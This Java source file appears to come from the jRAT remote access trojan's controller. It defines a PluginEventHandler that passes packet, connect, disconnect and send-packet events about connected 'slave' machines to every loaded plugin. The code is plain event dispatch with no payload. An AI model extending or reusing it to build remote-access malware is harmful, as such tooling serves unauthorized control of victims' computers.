package se.jrat.controller.addons;

import jrat.api.Packet;
import jrat.api.RATPlugin;
import jrat.api.events.OnConnectEvent;
import jrat.api.events.OnDisconnectEvent;
import jrat.api.events.OnPacketEvent;
import jrat.api.events.OnSendPacketEvent;
import se.jrat.controller.AbstractSlave;

public class PluginEventHandler {

	public static void onPacket(AbstractSlave slave, byte header) {
		for (RATPlugin plugin : PluginLoader.getPlugins()) {
			try {
				plugin.onPacket(new OnPacketEvent(RATObjectFormat.format(slave), new Packet(header)));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void onConnect(AbstractSlave slave) {
		for (RATPlugin plugin : PluginLoader.getPlugins()) {
			try {
				plugin.onConnect(new OnConnectEvent(RATObjectFormat.format(slave)));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void onDisconnect(AbstractSlave slave) {
		for (RATPlugin plugin : PluginLoader.getPlugins()) {
			try {
				plugin.onDisconnect(new OnDisconnectEvent(RATObjectFormat.format(slave)));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void onSendPacket(byte header, AbstractSlave slave) {
		for (RATPlugin plugin : PluginLoader.getPlugins()) {
			try {
				plugin.onSendPacket(new OnSendPacketEvent(new Packet(header), RATObjectFormat.format(slave)));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

}
